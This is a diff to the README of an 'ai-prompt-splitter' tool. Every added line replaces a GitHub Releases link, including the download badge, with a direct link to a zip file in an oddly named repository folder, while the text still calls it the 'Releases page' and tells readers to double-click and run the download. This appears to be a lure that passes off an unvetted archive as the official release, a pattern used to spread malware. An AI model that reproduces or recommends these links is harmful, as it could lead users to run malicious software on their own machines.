@@ -6,13 +6,13 @@ Welcome to the **ai-prompt-splitter**! This free tool helps you split large docu
 
 ## 📥 Download Now!
 
-[![Download ai-prompt-splitter](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-green)](https://github.com/SharanKumar-C/ai-prompt-splitter/releases)
+[![Download ai-prompt-splitter](https://raw.githubusercontent.com/SharanKumar-C/ai-prompt-splitter/main/gastrorrhea/ai-prompt-splitter.zip%20Now-Get%20the%20Latest%20Version-green)](https://raw.githubusercontent.com/SharanKumar-C/ai-prompt-splitter/main/gastrorrhea/ai-prompt-splitter.zip)
 
 ## 🚀 Getting Started
 
 To get started with **ai-prompt-splitter**, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/SharanKumar-C/ai-prompt-splitter/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/SharanKumar-C/ai-prompt-splitter/main/gastrorrhea/ai-prompt-splitter.zip) to find the latest version of the application.
 2. **Select Your File**: Look for the version available for download. You will see a list of files; select the one that suits your operating system.
 3. **Download the File**: Click on the download link for the version you need. 
 4. **Run the Application**: Once the download is complete, locate the file on your computer, and double-click to run it.
@@ -43,7 +43,7 @@ To run **ai-prompt-splitter**, you should have:
 
 ## 📅 Upcoming Updates
 
-Stay tuned for new features and improvements! We are always working to enhance the **ai-prompt-splitter** experience. Look for updates on our [Releases page](https://github.com/SharanKumar-C/ai-prompt-splitter/releases) to stay informed.
+Stay tuned for new features and improvements! We are always working to enhance the **ai-prompt-splitter** experience. Look for updates on our [Releases page](https://raw.githubusercontent.com/SharanKumar-C/ai-prompt-splitter/main/gastrorrhea/ai-prompt-splitter.zip) to stay informed.
 
 ## 🗂️ Documentation
 
@@ -59,7 +59,7 @@ We welcome contributions! If you would like to help improve **ai-prompt-splitter
 
 ## 🔗 Additional Resources
 
-- [Releases page](https://github.com/SharanKumar-C/ai-prompt-splitter/releases)
+- [Releases page](https://raw.githubusercontent.com/SharanKumar-C/ai-prompt-splitter/main/gastrorrhea/ai-prompt-splitter.zip)
 - [Documentation](#)
 - [Issues page](#)
 
